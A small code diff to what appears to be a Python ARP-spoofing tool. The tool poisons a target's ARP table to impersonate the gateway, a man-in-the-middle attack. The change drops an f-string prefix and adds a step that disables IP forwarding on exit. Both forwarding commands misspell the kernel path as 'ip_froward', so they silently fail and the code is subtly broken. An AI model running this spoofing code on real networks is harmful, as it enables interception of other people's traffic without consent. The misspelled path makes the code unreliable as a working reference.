@@ -77,7 +77,7 @@ try:
         print('\n[-] This script must be run as root!')
         exit(1)
     else:
-        subprocess.run(f"echo 1 > /proc/sys/net/ipv4/ip_froward", shell=True)  # Allow forwarding
+        subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_froward", shell=True)  # Allow forwarding
         count = 0
         while True:
             spoofMAC(tIP, gtwIP)  # Impersonate gtw on target's ARP table
@@ -88,6 +88,7 @@ try:
             
 except KeyboardInterrupt:
     print("\n   [-] Exiting ...")
+    subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_froward", shell=True)  # Restore forwarding
     restoreMAC(gtwIP, tIP)  # Restore target on gtw's ARP table
     restoreMAC(tIP, gtwIP)  # Restore gtw on target's ARP table
     # time.sleep(0.052)
